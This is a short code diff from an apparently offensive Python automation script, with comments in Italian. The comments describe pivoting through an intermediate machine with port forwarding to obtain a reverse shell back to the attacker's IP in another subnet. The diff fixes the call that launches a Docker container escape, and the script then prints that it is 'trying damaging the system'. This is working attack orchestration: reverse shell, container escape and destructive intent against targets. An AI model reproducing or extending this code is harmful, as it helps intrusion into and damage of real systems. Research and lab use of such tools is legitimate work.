@@ -139,11 +139,10 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
-                        
                        
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                        escape = mc.docker_escape(atk_sess)
+                        escape = mc.docker_escape(docker_escape_attack_object)
                         if(escape):
                             print(escape)
                             print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
